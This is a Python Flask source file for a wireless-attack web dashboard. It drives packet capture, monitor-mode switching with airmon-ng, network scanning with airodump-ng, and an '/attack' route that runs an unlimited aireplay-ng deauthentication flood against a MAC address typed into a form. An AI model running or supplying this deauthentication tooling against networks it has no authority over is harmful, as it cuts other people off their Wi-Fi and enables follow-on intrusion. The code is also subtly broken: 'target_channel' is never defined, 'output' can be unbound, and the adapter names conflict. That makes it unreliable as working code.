from flask import Flask, render_template, request , jsonify
import subprocess
import re
import pyshark
from flask_socketio import SocketIO
import time
import csv


app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret_key'
socketio = SocketIO(app)
csv_data = []

current_interface = None
capture = None

@app.route("/")
def home():
    # Run the neofetch command and capture its output
    output = subprocess.check_output(['neofetch', '--stdout'])

    # Convert the output to a string and pass it to the template
    return render_template('index.html', system_info=output.decode('utf-8'))

@app.route("/live", methods=['GET', 'POST'])
def live():
    if request.method == 'POST':
        selected_interface = request.form.get('interface')
        socketio.emit('start_capture' , selected_interface)
        return render_template('live.html', selected_interface=selected_interface)
    interfaces = get_network_interfaces()
    return render_template('live.html', interfaces=interfaces, selected_interface=current_interface)

def get_network_interfaces():
    output = subprocess.check_output(['ifconfig']).decode('utf-8')
    interface_lines = re.findall(r'^([a-zA-Z0-9]+):', output, re.MULTILINE)
    interfaces = [line.strip(':') for line in interface_lines]
    return interfaces

def packet_capture(interface):
    capture = pyshark.LiveCapture(interface=interface)
    for packet in capture.sniff_continuously():
        packet_data = {
            'time': packet.frame_info.time,
            'source': packet.ip.src if 'ip' in packet else '',
            'destination': packet.ip.dst if 'ip' in packet else '',
        }
        socketio.emit('packet', packet_data, namespace='/')

@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('start_capture')
def handle_start_capture(interface):
    print(f'Starting packet capture for interface: {interface}')
    socketio.start_background_task(packet_capture, interface)


@app.route("/config", methods=["GET", "POST"])
def config():
    result = ""
    if request.method == "POST":
        mode = request.form.get("mode")
        command = []
        if mode == "monitor":
            command = [
                "airmon-ng",
                "start",
                "wlan1",
            ]  # Replace 'wlan0' with your wireless adapter name
        elif mode == "managed":
            command = [
                "airmon-ng",
                "stop",
                "wlan1",
            ]  # Replace 'wlan0' with your wireless adapter name
        else:
            return render_template("config.html", result="wrong mode")
        result =  mode.capitalize()
        try:
            subprocess.run(command, check=True)
            result = f"Device set to {result} mode"
        except Exception as error:
            print(error)
            result = f"Error configuring {result} mode"
    return render_template("config.html", result= result)


@app.route("/status")
def wireless_adapter_status():
    # Check if wireless adapter is in monitor or managed mode
    output = subprocess.check_output(['sudo','iwconfig', 'wlan1']).decode('utf-8')
    adapter_status = re.findall(r'Mode:(.*?)  ', output, re.MULTILINE)[0]

    return render_template("status.html", adapter_status=adapter_status)

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    # Deauthentication attack logic
    interface = 'wlp0s20f0u2'  # Replace 'wlan0' with your wireless adapter name
    target_mac = request.form.get('target_mac', '')  # Get the target MAC address from the form input
    result=""
    if request.method == 'POST' and target_mac:
        # Execute the deauthentication attack command
        deauth_command = ['aireplay-ng', '--deauth', '0', '-a', target_mac, interface]
        
        # Set the target channel using the sudo iw command
        channel_command = ['sudo', 'iw', interface, 'set', 'channel', target_channel]
        
        try:
            # Set the channel
            subprocess.run(channel_command, check=True)
            
            # Execute the deauthentication attack
            output = subprocess.check_output(deauth_command, stderr=subprocess.STDOUT, universal_newlines=True)
            result = "Deauthentication attack completed"
        except subprocess.CalledProcessError as e:
            output = e.output
            result = "Failed to execute deauthentication attack"
    
    return render_template("attack.html", result=result, output=output)

@app.route('/run_airodump', methods=['POST'])
def run_airodump():
    # Run airodump-ng command for 25 seconds
    command = ['sudo', 'airodump-ng', '-w', 'airodump_output', '--output-format', 'csv', 'wlan1']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(25)
    process.terminate()

    message = 'Airodump CSV file has been generated.'

    # Read the generated CSV file
    global csv_data
    csv_data = []
    with open('airodump_output-01.csv', 'r') as file:
        csv_reader = csv.reader(file)
        for row in csv_reader:
            csv_data.append(row)

    return render_template('dump.html', message=message, show_csv_button=True)


@app.route('/dump', methods=['GET', 'POST'])
def upload_csv():
    global csv_data

    if request.method == 'POST':
        # Check if a file was uploaded
        if 'csv_file' not in request.files:
            return 'No file uploaded'

        file = request.files['csv_file']

        # Check if the file has a valid extension
        if file.filename == '':
            return 'No file selected'
        if not file.filename.endswith('.csv'):
            return 'Invalid file format. Please upload a CSV file.'

        # Read the CSV file
        csv_data = []
        csv_reader = csv.reader(file.read().decode('utf-8').splitlines())
        for row in csv_reader:
            csv_data.append(row)

        return render_template('dump.html', success_message='File has been uploaded.', csv_data=csv_data, show_csv_button=True)

    return render_template('dump.html', csv_data=csv_data)


@app.route('/show_csv')
def show_csv():
    if not csv_data:
        return 'No CSV data available.'

    return jsonify(csv_data)


if __name__ == "__main__":
    socketio.run(app)
